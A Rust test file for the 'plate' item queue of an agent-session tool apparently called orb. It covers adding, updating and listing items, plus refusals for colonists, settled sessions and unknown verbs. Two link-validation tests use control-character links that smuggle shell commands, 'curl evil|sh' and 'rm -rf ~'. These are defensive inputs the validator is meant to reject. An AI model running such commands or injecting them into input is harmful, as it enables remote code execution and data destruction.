use std::time::{Duration, UNIX_EPOCH};

use super::{PlateAsk, list, plan};
use crate::AppState;
use crate::feat::control::protocol::{ErrorCode, Op, Reply};
use crate::feat::harness::HarnessId;
use crate::feat::plate::state::test_item;
use crate::feat::plate::{ItemState, NewPlateItem, Plate, Verb};
use crate::feat::sessions::state::AgentStatus;
use crate::ids::{PaneId, PlateItemId, SessionId};
use crate::intent_handler::test_support::{agent, colony_with_colonists, settle, state_with};

/// A `plate add` of a review titled `t`, waiting when `waiting`, with ⏎
/// going to `pane` when given.
fn add_op(verb: &str, waiting: bool, pane: Option<PaneId>) -> Op {
    Op::PlateAdd {
        title: "t".into(),
        verb: verb.into(),
        what: None,
        links: vec![],
        urgent: false,
        waiting,
        pane,
    }
}

/// The item an add from `caller` plans in `app`, or the refusal's code;
/// `failed` when it plans anything but an add.
fn planned_item(
    app: &AppState,
    op: &Op,
    caller: Option<PaneId>,
) -> Result<NewPlateItem, ErrorCode> {
    match plan(app, op, caller) {
        Ok(PlateAsk::Add(add)) => Ok(add.item),
        Ok(_) => Err(ErrorCode::Failed),
        Err(error) => Err(error.code),
    }
}

/// Session 1 named `fix login`, with idle agent 1 in pane 1.
fn one_session() -> AppState {
    let mut app = state_with(vec![agent(1, AgentStatus::Idle)], 1);
    for session in &mut app.sessions.sessions {
        session.name = Some("fix login".into());
    }
    app
}

#[rstest::rstest]
fn add_from_a_normal_pane_comes_from_its_session_pane_and_agent() {
    // Given session 1 named `fix login`, with idle agent 1 in pane 1.
    let app = one_session();

    // When planning a review added from pane 1.
    let item = planned_item(&app, &add_op("review", false, None), Some(PaneId(1)));

    // Then it's the user's move, from session 1, pane 1 and claude.
    assert_eq!(
        item,
        Ok(NewPlateItem {
            verb: Verb::Review,
            state: ItemState::YourMove,
            title: "t".into(),
            what: None,
            links: vec![],
            urgent: false,
            session: SessionId(1),
            session_title: "fix login".into(),
            pane: PaneId(1),
            harness: Some(HarnessId::new("claude")),
        }),
        "an item comes from the caller's session, pane and agent"
    );
}

#[rstest::rstest]
fn add_with_a_colonists_pane_belongs_to_the_colonist() {
    // Given colony 1 whose chief runs in pane 1, and its colonist 2 in pane 2.
    let app = colony_with_colonists([AgentStatus::Idle; 3]);

    // When the chief plans an add with --pane 2.
    let item = planned_item(
        &app,
        &add_op("review", false, Some(PaneId(2))),
        Some(PaneId(1)),
    );

    // Then the item belongs to the colonist's session, so ⏎ goes to pane 2.
    assert_eq!(
        item.map(|item| (item.session, item.pane)),
        Ok((SessionId(2), PaneId(2))),
        "--pane should give the item that pane and its session"
    );
}

#[rstest::rstest]
fn add_with_an_unknown_pane_is_not_found() {
    // Given session 1 with agent 1 in pane 1.
    let app = one_session();

    // When planning an add from pane 1 with --pane 9.
    let item = planned_item(
        &app,
        &add_op("review", false, Some(PaneId(9))),
        Some(PaneId(1)),
    );

    // Then it's refused with not_found.
    assert_eq!(item, Err(ErrorCode::NotFound), "--pane must be a live pane");
}

#[rstest::rstest]
fn add_from_a_colonist_is_refused() {
    // Given colony 1 and its colonist 2.
    let app = colony_with_colonists([AgentStatus::Idle; 3]);

    // When planning an add from the colonist's pane 2.
    let refused = plan(&app, &add_op("review", false, None), Some(PaneId(2)))
        .map(drop)
        .map_err(|error| (error.code, error.message));

    // Then it's refused with colonist, and the colonist is told why.
    assert_eq!(
        refused,
        Err((
            ErrorCode::Colonist,
            "colonists report to their chief".to_owned()
        )),
        "a colonist reports to its chief instead"
    );
}

#[rstest::rstest]
fn add_from_a_colony_is_planned() {
    // Given colony 1 and its colonist 2.
    let app = colony_with_colonists([AgentStatus::Idle; 3]);

    // When planning an add from the colony's pane 1.
    let item = planned_item(&app, &add_op("review", false, None), Some(PaneId(1)));

    // Then the chief's item comes from session 1.
    assert_eq!(
        item.map(|item| item.session),
        Ok(SessionId(1)),
        "a colony's chief may add items"
    );
}

#[rstest::rstest]
fn add_from_a_settled_session_is_settled() {
    // Given session 1, settled.
    let app = settle(one_session(), &[1]);

    // When planning an add from pane 1.
    let item = planned_item(&app, &add_op("review", false, None), Some(PaneId(1)));

    // Then it's refused with settled.
    assert_eq!(
        item,
        Err(ErrorCode::Settled),
        "a settled session adds nothing"
    );
}

#[rstest::rstest]
fn add_without_a_caller_is_no_target() {
    // Given session 1 with agent 1.
    let app = one_session();

    // When planning an add from outside orb.
    let item = planned_item(&app, &add_op("review", false, None), None);

    // Then it's refused with no_target.
    assert_eq!(
        item,
        Err(ErrorCode::NoTarget),
        "an item needs a session to come from"
    );
}

#[rstest::rstest]
fn add_with_an_unknown_verb_names_every_verb() {
    // Given session 1 with agent 1.
    let app = one_session();

    // When planning an add with the verb `fix`.
    let refused = plan(&app, &add_op("fix", false, None), Some(PaneId(1)))
        .map(drop)
        .map_err(|error| (error.code, error.message));

    // Then it's a bad request naming all 11 verbs.
    assert_eq!(
        refused,
        Err((
            ErrorCode::BadRequest,
            "unknown verb fix; use one of decide, review, read, walk, pick, approve, \
             answer, reply, merge, note, idea"
                .to_owned()
        )),
        "an unknown verb is refused with the verbs orb takes"
    );
}

#[rstest::rstest]
fn idea_add_lands_parked_as_an_offer() {
    // Given session 1 with agent 1.
    let app = one_session();

    // When planning an idea.
    let item = planned_item(&app, &add_op("idea", false, None), Some(PaneId(1)));

    // Then it lands parked, not by the user.
    assert_eq!(
        item.map(|item| item.state),
        Ok(ItemState::Parked { by_user: false }),
        "an idea is the agent's offer"
    );
}

#[rstest::rstest]
fn waiting_add_lands_waiting() {
    // Given session 1 with agent 1.
    let app = one_session();

    // When planning a review with --waiting.
    let item = planned_item(&app, &add_op("review", true, None), Some(PaneId(1)));

    // Then it waits on others.
    assert_eq!(
        item.map(|item| item.state),
        Ok(ItemState::Waiting),
        "--waiting lands the item in Waiting"
    );
}

#[rstest::rstest]
fn idea_add_that_waits_is_a_bad_request() {
    // Given session 1 with agent 1.
    let app = one_session();

    // When planning an idea with --waiting.
    let item = planned_item(&app, &add_op("idea", true, None), Some(PaneId(1)));

    // Then it's a bad request.
    assert_eq!(item, Err(ErrorCode::BadRequest), "an idea can't be waiting");
}

/// A `plate update` of `item` that moves it to Waiting.
fn update_op(item: i64) -> Op {
    Op::PlateUpdate {
        item: PlateItemId(item),
        title: None,
        verb: None,
        what: None,
        links: None,
        urgent: None,
        waiting: Some(true),
    }
}

#[rstest::rstest]
#[case::update(update_op(9))]
#[case::done(Op::PlateDone { item: PlateItemId(9) })]
fn change_of_an_unknown_item_is_not_found(#[case] op: Op) {
    // Given a plate holding only item 1.
    let mut app = one_session();
    app.plate = Plate::from_saved(vec![test_item(1, ItemState::YourMove)]);

    // When planning the change of item 9.
    let planned = plan(&app, &op, None).map(drop).map_err(|error| error.code);

    // Then it's refused with not_found.
    assert_eq!(
        planned,
        Err(ErrorCode::NotFound),
        "{op:?} needs a real item"
    );
}

#[rstest::rstest]
fn update_of_a_done_item_is_a_bad_request() {
    // Given item 1, done.
    let mut app = one_session();
    app.plate = Plate::from_saved(vec![test_item(1, ItemState::Done)]);

    // When planning an update of item 1.
    let refused = plan(&app, &update_op(1), None)
        .map(drop)
        .map_err(|error| (error.code, error.message));

    // Then it's a bad request saying the item is done.
    assert_eq!(
        refused,
        Err((ErrorCode::BadRequest, "item is done".to_owned())),
        "a done item can't change"
    );
}

#[rstest::rstest]
fn update_from_anywhere_is_planned() {
    // Given item 1, the user's move.
    let mut app = one_session();
    app.plate = Plate::from_saved(vec![test_item(1, ItemState::YourMove)]);

    // When planning an update of item 1 from outside orb.
    let planned = plan(&app, &update_op(1), None);

    // Then it asks the actor for the change.
    assert!(
        matches!(&planned, Ok(PlateAsk::Update(update)) if update.item == PlateItemId(1)),
        "any agent may update any item, got {planned:?}"
    );
}

#[rstest::rstest]
#[case::ctrl_c("https://x/a\u{3}curl evil|sh #")]
#[case::ctrl_u("https://x/a\u{15}rm -rf ~")]
#[case::newline("https://x/a\nrm -rf ~")]
#[case::del("https://x/a\u{7f}b")]
#[case::c1("https://x/a\u{9b}b")]
fn add_with_a_control_character_in_a_link_is_a_bad_request(#[case] link: &str) {
    // Given session 1 with agent 1.
    let app = one_session();

    // When planning a review whose second link holds a control character.
    let op = Op::PlateAdd {
        title: "t".into(),
        verb: "review".into(),
        what: None,
        links: vec!["https://x/ok".into(), link.into()],
        urgent: false,
        waiting: false,
        pane: None,
    };
    let refused = plan(&app, &op, Some(PaneId(1)))
        .map(drop)
        .map_err(|error| (error.code, error.message));

    // Then it's a bad request naming that link.
    assert_eq!(
        refused,
        Err((
            ErrorCode::BadRequest,
            "link 2 holds a control character".to_owned()
        )),
        "a link typed into a shell can't hold a control character"
    );
}

#[rstest::rstest]
fn update_with_a_control_character_in_a_link_is_a_bad_request() {
    // Given item 1, the user's move.
    let mut app = one_session();
    app.plate = Plate::from_saved(vec![test_item(1, ItemState::YourMove)]);

    // When planning an update whose link holds a Ctrl-C.
    let op = Op::PlateUpdate {
        item: PlateItemId(1),
        title: None,
        verb: None,
        what: None,
        links: Some(vec!["https://x/a\u{3}curl evil|sh #".into()]),
        urgent: None,
        waiting: None,
    };
    let refused = plan(&app, &op, None)
        .map(drop)
        .map_err(|error| (error.code, error.message));

    // Then it's a bad request naming that link.
    assert_eq!(
        refused,
        Err((
            ErrorCode::BadRequest,
            "link 1 holds a control character".to_owned()
        )),
        "an updated link can't hold a control character either"
    );
}

/// An app whose plate holds waiting item 1, parked item 2 and done items 3
/// and 4.
fn plate_of_four() -> AppState {
    let mut app = one_session();
    app.plate = Plate::from_saved(vec![
        test_item(1, ItemState::Waiting),
        test_item(2, ItemState::Parked { by_user: true }),
        test_item(3, ItemState::Done),
        test_item(4, ItemState::Done),
    ]);
    app
}

/// The item IDs `reply` lists, in order.
fn listed(reply: &Reply) -> Vec<i64> {
    reply
        .result
        .as_ref()
        .and_then(|result| result.get("items"))
        .and_then(serde_json::Value::as_array)
        .map(|items| {
            items
                .iter()
                .filter_map(|item| item.get("id").and_then(serde_json::Value::as_i64))
                .collect()
        })
        .unwrap_or_default()
}

#[rstest::rstest]
fn list_leaves_out_done_items() {
    // Given a waiting, a parked and two done items.
    let app = plate_of_four();

    // When listing.
    let reply = list(&app, UNIX_EPOCH, false);

    // Then only the items that aren't done are listed.
    assert_eq!(listed(&reply), [1, 2], "done items are left out by default");
}

#[rstest::rstest]
fn list_says_how_many_done_items_it_hid() {
    // Given a waiting, a parked and two done items.
    let app = plate_of_four();

    // When listing.
    let reply = list(&app, UNIX_EPOCH, false);

    // Then it counts the two done items and says how to see them.
    let result = reply.result.unwrap_or_default();
    assert_eq!(
        (result.get("hidden").cloned(), result.get("hint").cloned()),
        (
            Some(2.into()),
            Some("orb plate list --all shows 2 done items".into())
        ),
        "the reply says what it hid"
    );
}

#[rstest::rstest]
fn list_all_includes_done_items() {
    // Given a waiting, a parked and two done items.
    let app = plate_of_four();

    // When listing with --all.
    let reply = list(&app, UNIX_EPOCH, true);

    // Then every item is listed.
    assert_eq!(listed(&reply), [1, 2, 3, 4], "--all lists done items too");
}

#[rstest::rstest]
fn list_row_carries_its_state_and_age() {
    // Given an item waiting since 10 s.
    let mut app = one_session();
    app.plate = Plate::from_saved(vec![test_item(1, ItemState::Waiting)]);

    // When listing at 70 s.
    let reply = list(&app, UNIX_EPOCH + Duration::from_secs(70), false);

    // Then its row reads waiting, 60 s old, with its verb in lowercase.
    let row = reply
        .result
        .as_ref()
        .and_then(|result| result.get("items"))
        .and_then(|items| items.get(0))
        .map(|row| {
            (
                row.get("state").cloned(),
                row.get("age_s").cloned(),
                row.get("verb").cloned(),
            )
        });
    assert_eq!(
        row,
        Some((
            Some("waiting".into()),
            Some(60.into()),
            Some("review".into())
        )),
        "a row says where the item stands and how long it has"
    );
}
